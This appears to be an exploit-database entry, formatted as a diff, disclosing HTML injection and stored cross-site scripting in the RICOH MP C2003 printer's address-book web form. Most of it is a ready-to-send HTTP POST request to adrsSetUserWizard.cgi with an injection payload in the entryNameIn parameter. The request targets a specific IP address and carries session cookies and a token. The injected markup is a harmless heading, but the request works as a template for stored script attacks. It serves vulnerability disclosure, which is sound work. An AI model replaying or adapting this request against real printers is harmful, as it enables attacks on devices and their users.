@@ -1,0 +1,31 @@
+# Exploit Title: RICOH MP C2003 Printer - Cross-Site Scripting
+# Date: 2018-09-21 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ricoh.com/
+# Hardware Link : https://www.ricoh.ca/en/products/pd/mp-c2003-color-laser-multifunction-printer/_/R-240-417253
+# Software : RICOH Printer
+# Product Version:  MP C2003
+# Vulernability Type : Code Injection
+# Vulenrability : HTML Injection and Stored XSS
+# CVE : N/A
+
+# On the MP C2003 printer, HTML Injection and Stored XSS vulnerabilities have been discovered in 
+# the area of adding addresses via the entryNameIn parameter 
+# to /web/entry/en/address/adrsSetUserWizard.cgi.
+
+# HTTP POST Request :
+
+POST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1
+Host: 134.96.209.202
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/plain, */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://134.96.209.202/web/entry/en/address/adrsList.cgi
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 193
+Cookie: risessionid=028553667951828; cookieOnOffChecker=on; wimsesid=552487526
+Connection: close
+
+mode=ADDUSER&step=BASE&wimToken=1581082599&entryIndexIn=00005&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1
